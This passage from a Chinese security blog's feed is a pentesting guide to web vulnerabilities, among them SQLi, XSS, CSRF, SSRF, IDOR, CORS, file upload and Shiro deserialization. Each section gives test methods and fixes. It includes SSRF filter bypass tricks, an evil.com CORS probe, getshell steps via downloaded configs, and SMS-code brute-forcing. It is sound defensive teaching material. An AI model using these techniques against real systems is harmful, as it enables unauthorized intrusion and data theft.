href="https://cn-sec.com/archives/1177113.html">记一次艰难的任意文件下载漏洞挖掘和总结思考</a><ul><li>下载各种配置文件分析出用户凭据进行利用</li><li>通过目录结构下载源码进行审计</li><li>文件下载getshell：<ul><li>首先收集系统信息，包括系统版本，中间件，cms版本，服务器用途，服务器使用者信息，端口，web路径等，然后根据收集到的信息，下载配置文件，如weblogic，ftp，ssh，等， 根据下载到的配置文件进行渗透。<ul><li>常见漏洞利用方式：<ul><li><ol><li>下载到密码配置文件，下载到软件配置文件，如weblogic，ssh，ftp，数据库配置文件等， 当解出密码后，进行登陆，getshell</li></ol></li><li><ol start="2"><li>下载web目录的web文件  进行代码审计</li></ol><ul><li>一般是先猜测web目录的地址，在下载web业务文件，审计常用的漏洞，据架构不同常常分为以下几种方式:<ul><li>php+mysql ，审计常见的sql注入，代码执行，密码找回逻辑，文件上传等，进行getshell</li><li>jsp+oracle|  , 先下载&#x2F;WEB-INF&#x2F;classes&#x2F;applicationContext.xml，再下载&#x2F;WEB-INF&#x2F;classes&#x2F;xxx&#x2F;xxx&#x2F;ccc.class 进行反编译</li><li>aspx+mssql</li></ul></li></ul></li><li><ol start="3"><li>下载日志</li></ol><ul><li>下载日志文件，找到登录&#x2F;上传&#x2F;后台&#x2F; 操作，找到登录入口 可以爆破，测试默认口令，弱口令，  找到文件上传点则测试文件上传漏洞，找到后台操作试试有没有未授权访问</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li><li>越权，文件遍历</li><li>目录遍历</li></ul><h2 id="文件上传处"><a href="#文件上传处" class="headerlink" title="文件上传处"></a>文件上传处</h2><p>1、文件上传XSS<br>2、普通上传</p><h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><p>相关漏洞</p><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><h4 id="shiro-rememberMe反序列化漏洞（Shiro-550）"><a href="#shiro-rememberMe反序列化漏洞（Shiro-550）" class="headerlink" title="shiro rememberMe反序列化漏洞（Shiro-550）"></a>shiro rememberMe反序列化漏洞（Shiro-550）</h4><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。<br>在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。<br><strong>影响版本</strong><br>Apache Shiro &lt; 1.2.4</p><p><strong>特征判断</strong><br>返回包中包含rememberMe&#x3D;deleteMe字段</p><p><strong>漏洞利用</strong><br>检查是否存在默认的key。<br>这里我们使用一个 Shiro_exploit，获取key<br>Github项目地址：<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p><h4 id="shiro-Padding-Oracle-Attack（Shiro-721）"><a href="#shiro-Padding-Oracle-Attack（Shiro-721）" class="headerlink" title="shiro Padding Oracle Attack（Shiro-721）"></a>shiro Padding Oracle Attack（Shiro-721）</h4><p>由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><p><strong>影响版本</strong><br>Apache Shiro &lt; 1.4.2版本</p><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><h3 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h3><p><img src="/2020/08/18/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%88%91%E8%A7%81/%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%E6%80%9D%E8%B7%AF.png" alt="安全测试之我见"></p><h3 id="图形验证码绕过"><a href="#图形验证码绕过" class="headerlink" title="图形验证码绕过"></a>图形验证码绕过</h3><ol><li>验证码刷新之后，而历史刷新的验证码还是可以继续使用</li><li>验证码使用过后不刷新，时效性不过期，可以一直复用</li><li>很多验证码的显示很简单，容易被机器识别</li></ol><h3 id="短信类验证码绕过"><a href="#短信类验证码绕过" class="headerlink" title="短信类验证码绕过"></a>短信类验证码绕过</h3><ol><li>验证码过于简易&amp;接口未限制：有些手机短信验证码都为 4-8位 纯数字的验证码，在接口没有任何限制的情况下是可以直接爆破的</li><li>验证码发送复用&amp;时效性过长&amp;接口未限制：位数验证码时效性为5分钟，但是在这里同一手机号发送的验证码都是一样的，所以可以在4分钟的时候重新发送一次验证码这样验证码就又有效了，因为验证码一直在被复用，所以可以爆破</li><li>万能验证码：这是很多大企业的诟病，在未上线前为了方便测试加了888888、000000这样的万能验证码但是上线后没去删除测试的3内容导致被恶意利用</li></ol><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ul><li>漏洞原理<br>原理：开发者在编写操作数据库代码时，直接将外部可控的参数拼接到SQL语句中，没有经过任何过滤就直接放入数据库引擎执行。<br>把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</li><li>漏洞危害<br>（1）攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。<br>（2）可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。<br>（3）如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。<br>（4）经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。</li><li>测试方法<br>手工&amp;自动化工具一把梭<br><a href="https://www.jianshu.com/p/50a48ac63cc5">SQL注入漏洞测试的方式总结</a></li><li>修复建议<ul><li>sql语句预编译</li><li>使用标准化的数据库查询语句API接口，进行参数过滤，转义等方式防止用户输入恶意字符</li></ul></li></ul><h2 id="xss跨站脚本攻击"><a href="#xss跨站脚本攻击" class="headerlink" title="xss跨站脚本攻击"></a>xss跨站脚本攻击</h2><ul><li>漏洞原理<br>XSS的漏洞主要成因是后端接收参数时未经过滤，导致参数改变了HTML的结构，从而被浏览器或后端代码执行</li><li>漏洞危害<br>1、网络钓鱼，包括盗取各类用户账号；<br>2、窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；<br>3、劫持用户(浏览器)会话，从而执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件等；<br>4、强制弹出广告页面、刷流量等；<br>5、网页挂马，进行恶意操作，例如任意篡改页面信息、删除文章等；<br>6、进行大量的客户端攻击，如DDoS攻击；<br>7、获取客户端信息，例如用户的浏览历史、真实IP、开放端口等；<br>8、控制受害者机器向其他网站发起攻击；<br>9、结合其他漏洞，如CSRF漏洞，实施进一步作恶；<br>10、提升用户权限，包括进一步渗透网站；<br>11、传播跨站脚本蠕虫等；</li><li>测试方法<ul><li>找到一个存在问题的地方，提交一下代码，如果出现弹窗或者打开开发者，发现报错，即为XSS漏洞</li><li>获取流量，对流量进行分析，比如<code>Xray</code></li></ul></li><li>修复建议<br>a、在服务器端检查敏感的HTML代码，对敏感字符进行转义<br>b、接入xss过滤平台，做统一的XSS关键字的过滤及管控</li></ul><h2 id="csrf跨站请求伪造"><a href="#csrf跨站请求伪造" class="headerlink" title="csrf跨站请求伪造"></a>csrf跨站请求伪造</h2><ul><li>漏洞原理<br>CSRF：跨站请求伪造，在一个用户登录一个网站后会产生一个cookie，在没有登出的情况下，访问另外的页面，这个页面向该网站进行请求，网站仅用cookie做验证，没有做其他的校验，从而认为这个请求是合法的，就带来了CSRF跨站请求伪造漏洞。</li><li>漏洞危害<br>修改任何允许修改的数据，执行任何用户允许的操作，例如修改密码，登录注销等</li><li>测试方法<br>Csrf多处存在于 修改 增加 删除 等操作中都可以尝试使用跨站请求伪造<br>去掉一些认证字段如token、referer等认证字段，如果可以正常请求，说明存在漏洞<ul><li>GET类型的CSRF的检测<br>如果有token等验证参数，先去掉参数尝试能否正常请求。如果可以，即存在CSRF漏洞</li><li>POST类型的CSRF的检测<br>如果有token等验证参数，先去掉参数尝试能否正常请求。如果可以，再去掉referer参数的内容，如果仍然可以，说明存在CSRF漏洞，可以利用构造外部form表单的形式，实现攻击。如果直接去掉referer参数请求失败，这种还可以继续验证对referer的判断是否严格，是否可以绕过</li></ul></li><li>修复建议<br>1、<code>添加验证码</code>：在一些特殊请求页面增加验证码，验证码强制用户必须与应用进行交互，才能完成最终请求<br>2、<code>检测referer</code>：检测referer的值，来判断请求来源是否合法<br>3、<code>添加Token</code>：在每个请求中设置Token是一种流行的方式来防御CSRF。CSRF攻击的原理：攻击者可以猜测到用户请求，现在在每个请求中加一个随机的Toekn值<br>Token要足够随机————只有这样才算不可预测<br>Token是一次性的，即每次请求成功后要更新Token————这样可以增加攻击难度，增加预测难度<br>Token要注意保密性————敏感操作使用post，防止Token出现在URL中</li></ul><p><strong>XSS与CSRF的区别</strong></p><ol><li>XSS 是代码注入问题，CSRF 是 HTTP 问题<ul><li>XSS 是内容没有过滤导致浏览器将攻击者的输入当代码执行</li><li>CSRF 则是因为浏览器在发送 HTTP 请求时候自动带上 cookie，而一般网站的 session 都存在 cookie里面(Token验证可以避免)。</li></ul></li><li>CSRF：需要用户先登录网站A，获取 cookie<br>XSS：不需要登录</li><li>CSRF：是利用网站A本身的漏洞，去请求网站A的api<br>XSS：是向网站 A 注入 JS代码，然后执行 JS 里的代码，篡改网站A的内容。</li></ol><h2 id="ssrf服务器端请求伪造"><a href="#ssrf服务器端请求伪造" class="headerlink" title="ssrf服务器端请求伪造"></a>ssrf服务器端请求伪造</h2><p><strong>漏洞原理</strong></p><p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现在这个请求是合法的，然后服务器以他的身份来访问其他服务器的资源</p><p><strong>漏洞危害</strong></p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li><li>攻击运行在内网或本地的应用程序（比如溢出）</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</li><li>利用 file 协议读取本地文件等</li></ol><p><strong>漏洞检测</strong><br>1、从WEB功能上寻找</p><ul><li>分享：通过URL地址分享网页内容</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：通过URL地址翻译对应文本的内容</li><li>图片加载与下载：通过URL地址加载或下载图片</li><li>图片、文章收藏功能</li><li>未公开的api实现及其他调用URL的功能</li></ul><p>2、从URL关键字中寻找</p><ul><li>share、wap、url、link、src、source、target、u、3g、display、sourceURI、imageURI、domain</li></ul><p>3.排除法：浏览器f12查看源代码看是否是在本地进行了请求</p><ul><li>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></li></ul><p>4、dnslog等工具进行测试，看是否被访问</p><ul><li>可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</li></ul><p>5、抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址.<br>6、直接返回的Banner、title、content等信息<br>7、留意bool型SSRF</p><p><strong>绕过方法</strong></p><ul><li><p>1、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30x跳转</span><br></pre></td></tr></table></figure><p>：当防御方限制只允许http(s)访问或者对请求的host做了正确的校验后，可以通过30x方式跳转进行绕过</p><ul><li>针对只允许http(s)协议的情况，我们可以通过<br>Location: dict:&#x2F;&#x2F;127.0.0.1:6379跳转到dict协议，从而扩大我们攻击面，来进行更深入的利用</li></ul></li><li><p>2、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL解析绕过</span><br></pre></td></tr></table></figure><ul><li>通过url解析绕过只解析@后面的域名，列如： <a href="http://www.baidu.com@127.0.0.1/">http:&#x2F;&#x2F;www.baidu.com@127.0.0.1</a></li><li>利用语言本身自带的解析函数差异来绕过检测，如在python3中，对于同一个url:<a href="http://baidu.com/@qq.com%EF%BC%8Curllib%E5%92%8Curllib3%E7%9A%84%E8%A7%A3%E6%9E%90%E5%B0%B1%E4%B8%8D%E4%B8%80%E8%87%B4%E3%80%82">http://baidu.com@qq.com，urllib和urllib3的解析就不一致。</a></li></ul></li><li><p>3、<code>DNS解析绕过</code>:通过dns解析绕过私有地址限制探测内网 列 <a href="http://www.127.0.0.1.xip.io/">www.127.0.0.1.xip.io</a></p></li><li><p>4、<code>编码进制绕过</code>:列如：ip进制转换</p></li><li><p>5、<code>利用IPv6绕过</code>:有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如::1或IPv6的内网域名–x.1.ip6.name来绕过过滤</p></li></ul><p><strong>修复方案</strong></p><ol><li>禁止跳转</li><li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题</li><li>设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</li><li>限制请求的端口为http常用的端口，比如 80、443、8080、8090</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li><li>去除url中的特殊字符（为了防止利用url parse的特性造成url解析差异）</li><li>判断是否属于内网ip</li><li>如果是域名的话，将url中的域名改为ip（防止dns rebinding）</li><li>请求的url为3中返回的url</li><li>请求时设置host header为ip（为了防止以ip请求时，某些网站无法访问的问题）</li><li>不跟随30x跳转（跟随跳转需要从1开始重新检测）（防止30x跳转进行绕过）</li></ol><h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>水平越权：普通用户之间操作可互相影响<br>垂直越权：低权限用户能操作高权限用户才能操作的东西</p><p>Bp 抓包查看并修改低权限用户的身份信息为同等权限的其他用户或者是高权限用户后进行重放<br>或用低权限的账户去访问高权限的账户的数据，一般是通过访问接口来进行测试<br>如果成功则说明漏洞存在</p><p>首先需要确认身份认证的字段，确认确认等字段进行认证，然后更换认证字段的数值，进行测试越权<br>如：测试通过Authorization字段进行认证，首先需要删除如cookie字段的认证，然后看是否有回显<br>若有，则表示Authorization字段是唯一认证，可直接进行测试<br>若无，则需要删除cookie字段的数值进行排查，确认cookie中是否有一些字段和Authorization一起认证，然后修改对应的字段进行测试</p><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><ul><li>漏洞原理<br>指攻击者尝试访问与他拥有相同权限的用户资源。例如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的这种行为就叫做水平越权访问。</li></ul><p>水平权限漏洞一般出现在一个用户对象关联多个其他对象（订单、地址等）、并且要实现对关联对象的CRUD的时候。开发容易习惯性的在生成CRUD表单（或AJAX请求）的时候根据认证过的用户身份来找出其有权限的被操作对象id，提供入口，然后让用户提交请求，并根据这个id来操作相关对象。在处理CRUD请求时，往往默认只有有权限的用户才能得到入口，进而才能操作相关对象，因此就不再校验权限了。可悲剧的是大多数对象的ID都被设置为自增整型，所以攻击者只要对相关id加1、减1、直至遍历，就可以操作其他用户所关联的对象了。</p><ul><li>测试方法<br>修改参数的值，若能看到其他账户的数据，即为水平越权</li></ul><p>漏洞示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getAddress.do?addressId=12345</span><br></pre></td></tr></table></figure><p>攻击者修改addressId即可得到他人的address信息</p><ul><li>修复方案</li></ul><ol><li><strong>在web层的逻辑中做鉴权</strong><br>这个是最直接有效的修复方案：在web层的逻辑中做鉴权，检查提交CRUD请求的操作者（通过session信息得到）与目标对象的权限所有者（查数据库）是否一致，如果不一致则阻断。这个方案实现成本低、能确保漏洞的修复质量，缺点是增加了一次查库操作。我之前一直用这种方案来对已发生的水平权限漏洞做紧急修复。</li><li><strong>把权限的控制转移到数据接口层中</strong><br>最正规的方案：把权限的控制转移到数据接口层中，避免出现<code>select/update/delete ... where addressID=#addressID#</code>的SQL语句，使用<code>selectt/update/delete... where addressID=#addressID# and ownerId=#userId#</code>来代替，要求web层在调用数据接口层的接口时额外提供userid，而这个userid在web层看来只能通过seesion来取到。这样在面对水平权限攻击时，web层的开发者不用额外花精力去注意鉴权的事情，也不需要增加一个SQL来专门判断权限——如果权限不对的话，那个and条件就满足不了，SQL自然就找不到相关对象去操作。而且这个方案对于一个接口多个地方使用的情况也比较有利，不需要每个地方都鉴权了。<br>但这个方案的缺陷在于实现起来要改动底层的设计，所以不适合作为修复方案，更适合作为统一的控制方案在最开始设计时就注意这方面的问题。</li><li><strong>在生成表单时，增加一个token参数</strong><br>在生成表单时，增加一个token参数，即<code>token=md5(addressId+sessionId+key)；</code>在处理请求时，用addressId、sessionId和key来验证token。</li></ol><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><ul><li>漏洞原理<br>由于后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的</li><li>测试方法</li></ul><p>用低权限的账户去访问高权限的账户的数据<br>一般就是修改token，通过接口来进行测试</p><ul><li>修复方案</li></ul><p>对需要权限的页面进行 SESSION 认证，对用户访问的每一个 URL 做身份鉴别</p><p>正确校验用户的身份和 token</p><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><ul><li><p>漏洞原理<br>文件上传是一种<strong>数据与代码分理原则</strong>的攻击</p><ul><li><p><strong>原理</strong>:网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门，通过脚本文件获得了执行服务器端命令的能力</p></li><li><p>危害</p><p>: 恶意文件传递给解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。根据网站使用及可解析的程序脚本不同，可以上传的恶意脚本可以是PHP、ASP、JSP、ASPX文件。</p><ul><li>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行</li><li>上传文件是Flash的策略文件crossdo-main.xml，黑客用以控制Flash在该域下的行为（其他通过类似方式控制策略文件的情况类似）</li><li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行</li><li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈</li></ul></li></ul></li><li><p>测试方法<br>1、查看是否是IIS6.0等搭建的，因为如果是这些服务器搭建的话我们是可以通过解析漏洞或者00截断来上传我们想要上传的文件<br>2、如果只是前端判断上传的文件后缀名的话，我们可以用Burp来绕过<br>3、如果是只判断了HTTP&#x2F;HTTPS的请求包中的Content-type我们就只需要修改为合法的就可以上传了。<br>上传一个文件，通过一些方法绕过客户端和服务端的校验，具体方法总结如下：<br><a href="https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">文件上传漏洞总结</a></p></li><li><p>修复建议</p><ul><li>文件扩展名服务端校验：判断文件类型，增加黑名单逻辑</li><li>文件内容服务端校验</li><li>上传文件重命名：使用随机数改写文件名跟路径</li><li>上传文件路径隐藏.</li><li>单独设置文件服务器的域名</li><li>文件上传的目录设置为不可执行，文件上传后会放到独立的存储上，做静态文件处理。</li></ul></li></ul><h2 id="cors跨域资源共享漏洞"><a href="#cors跨域资源共享漏洞" class="headerlink" title="cors跨域资源共享漏洞"></a>cors跨域资源共享漏洞</h2><p><a href="https://cloud.tencent.com/developer/article/1516490">CORS配置不当—挖掘技巧及实战案例全汇总</a><br><a href="https://xz.aliyun.com/t/2745">cors安全完全指南</a></p><ul><li><strong>漏洞原理</strong><br>CORS，即跨源资源共享（Cross-Origin Resource Sharing）。同源策略（Same OriginPolicy）要求不同源之间是无法通信的，而CORS则是放宽同源策略以通过浏览器实现网站之间通信的机制<br>CORS全称为Cross-Origin Resource Sharing即跨域资源共享，用于绕过SOP（同源策略）来实现跨域资源访问的一种技术。<br>CORS漏洞则是利用CORS技术窃取用户敏感数据，CORS漏洞的成因是<code>服务端配置的规则不当所导致的</code>，服务器端没有配置<code>Access-Control-Allow-Origin</code>等字段</li><li><strong>漏洞危害</strong><br>1、获取用户数据<br>2、客户端缓存中毒：这种配置允许攻击者利用其他的漏洞，更改没有验证的字段，看是否正常回显。比如，一个应用返回数据报文头部中包含“X-User”这个字段，这个字段的值没有经过验证就直接输出到返回页面上，此时就可以结合XSS漏洞来利用。<br>3、服务端缓存中毒：利用CORS的错误配置注入HTTP头部，这可能会被服务器端缓存下来，比如制造存储型xss</li><li><strong>测试方法</strong><br>查看是否存在get请求的json形式敏感信息，在请求头中添加任意Origin值，如<a href="https://evil.xn--com%2C:access-control-allow-origin:https-p059do49bba822wts1ktzpa9z4nfj5jea//evil.com和Access-Control-Allow-Credentials：true，若返回，则构造poc.html进行跨域读取数据。">https://evil.com，查看返回头是否返回：Access-Control-Allow-Origin:https://evil.com和Access-Control-Allow-Credentials：true，若返回，则构造poc.html进行跨域读取数据。</a><br>CORS配置不当通常会导致的危害是用户敏感信息泄露，场景大多数是get请求方式返回的json形式的敏感信息（密钥、token，key等）。CORS配置不当属于响应头中的一种，其他还有X-Frame-Options、Content-Security-Policy等。漏洞利用成功的前提是，两个返回头必须为：Access-Control-Allow-Origin:<a href="https://evil.com/">https://evil.com</a><br>更改响应头<code>Access-Control-Allow-Origin</code>或<code>Origin</code>字段等，看返回头是否返回CORS配置字段</li><li><strong>修复建议</strong><br>1、仔细评估是否开启CORS，如果不必要就不要开启CORS。<br>2、如果是绝对必要的话，要定义“源”的白名单。尽量不使用正则表达式配置，不要配置“Access-Contol-Allow-Origin”为通配符“*”，同时严格校验来自请求的Origin值。<br>3、仅仅允许安全的协议，有必要验证协议以确保不允许来自不安全通道（HTTP）的交互，否则中间人(MitM)将绕过应用是所使用的HTTPS。<br>4、要尽可能的返回”Vary: Origin”这个头部，以避免攻击者利用浏览器缓存。<br>5、如果可能的话避免使用“Credentials”头，由于“Access-Control-Allow-Credentials”标头设置为“true”时允许跨域请求中带有凭证数据，因此只有在严格必要时才应配置它。此头部也增加了CSRF攻击的风险;因此，有必要对其进行保护。<br>6、限制使用的方法，通过“Access-Control-Allow-Methods”头部，还可以配置允许跨域请求的方法，这样可以最大限度地减少所涉及的方法。<br>7、限制缓存的时间，通过“Access-Control-Allow-Methods”和“Access-Control-Allow-Headers”头部，限制浏览器缓存信息的时间。可以通过使用“Access-Control-Max-Age”标题来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值（例如大约30分钟），确保浏览器在短时间内可以更新策略（比如允许的源）。<br>8、仅配置所需要的头，仅在接收到跨域请求的时候才配置有关于跨域的头部，并且确保跨域请求是合法的（只允许来自合法的源）。</li></ul><h2 id="弱口令漏洞"><a href="#弱口令漏洞" class="headerlink" title="弱口令漏洞"></a>弱口令漏洞</h2><ul><li>漏洞原理</li></ul><p>这个应该是与个人习惯相关与意识相关，为了避免忘记密码，使用一个非常容易记住的密码，或者是直接采用系统的默认密码等。相关的安全意识不够，总认为不会有人会猜到我这个弱口令的，相关的安全意识不够，总认为不会有人会猜到我这个弱口令的。</p><ul><li>漏洞危害<br>通过系统弱口令，可被黑客直接获得系统控制权限。</li><li>测试方法<br>burp抓包或使用批量的脚本，来爆破弱密码</li><li>修复建议<br>规定密码强度，设置密码通常遵循以下原则：<br>（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令。<br>（2）口令长度不小于8 个字符。<br>（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）。<br>（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符。<br>（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail 地址等等与本人有关的信息，以及字典中的单词。<br>（6）口令不应该为用数字或符号代替某些字母的单词。<br>（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入。<br>（8）至少90 天内更换一次口令，防止未被发现的入侵者继续使用该口令</li></ul><h2 id="URL跳转漏洞"><a href="#URL跳转漏洞" class="headerlink" title="URL跳转漏洞"></a>URL跳转漏洞</h2><ul><li>漏洞原理</li></ul><p>服务端未对传入的跳转url变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。</p><ul><li>漏洞危害</li></ul><p>由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易；还可以造成xss漏洞</p><ul><li>漏洞检测</li></ul><p>修改参数中的合法URL为非法URL，然后查看是否能正常跳转或者响应包是否包含了任意的构造URL</p><ul><li><p>修复方案</p><ul><li><p>1.若跳转的URL事先是可以确定的，包括url和参数的值，则可以在后台先配置好，url参数只需传对应url的索引即可，通过索引找到对应具体url再进行跳转；</p></li><li><p>2.若跳转的URL事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名，而跳转cg首先需要进行验证签名通过才能进行跳转；</p></li><li><p>3.若1和2都不满足，url事先无法确定，只能通过前端参数传入，则必须在跳转的时候对url进行按规则校验：即控制url是否是你们公司授权的白名单或者是符合你们公司规则的url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function checkURL ( sURL) &#123;</span><br><span class="line">return (/^(https?:\/\/)?[\w-.]+.(yourDomainA|yourDomainB|yourDomainC).com($|\/|\)/i).test(sUrl)||(/^[\w][\w\/.-_%]+$/i).test(sUrl)||(/^[\/\][^\/\]/i).test(sUrl) ? true : false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>4.XSS漏洞的注意事项 ：跳转url检测中也加入了CRLF头部注入漏洞的检测逻辑, 具体就是在请求参数中加入了%0d%0a这种测试代码，需要对这些参数进行删除处理(事实上：在判断到一个参数中包含 %00 -&gt; %1f 的控制字符时都是不合法的，需对其进行删除)。</p></li></ul></li></ul><h2 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h2><p>短信轰炸可以分为横向和纵向两类</p><ul><li>横向：可以通过xff头等绕过短信发送频率限制，插件：<a href="https://github.com/TheKingOfDuck/burpFakeIP">burpFakeIP</a></li><li>纵向：如果没有设置获取短信的获取发送频率，就可以通过多次重放，导致短信轰炸</li></ul><h1 id="学习文章"><a href="#学习文章" class="headerlink" title="学习文章"></a>学习文章</h1><p><a href="https://testerhome.com/topics/24719">基于全流量权限漏洞检测技术</a></p><h1 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h1><h2 id="token未及时失效问题记录"><a href="#token未及时失效问题记录" class="headerlink" title="token未及时失效问题记录"></a>token未及时失效问题记录</h2><p>token在主页，无法进行刷新token并发处理</p><p>设置autherization字段进行验证<br>登录一次刷新一次 定期10分钟刷新</p><h2 id="XSS漏洞的修复"><a href="#XSS漏洞的修复" class="headerlink" title="XSS漏洞的修复"></a>XSS漏洞的修复</h2><p>接入工具XSS过滤器</p><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><p>1、ABC端的概念</p><ul><li><strong>A端是开发界面</strong><br>即管理员所接触的界面</li><li><strong>B端是商家界面</strong><br>即浏览器界面，依托于Web界面</li><li><strong>C端是用户界面</strong><br>即app的界面，用户接触最为广泛的界面</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95&quot;&gt;业务安全测试&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5</summary>
      
    
    
    
    
    <category term="安全评估" scheme="https://yinwc.github.io/tags/%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSRF漏洞总结</title>
    <link href="https://yinwc.github.io/2020/07/28/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://yinwc.github.io/2020/07/28/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2020-07-28T08:26:30.000Z</published>
    <updated>2023-02-02T06:24:42.583Z</updated>
    
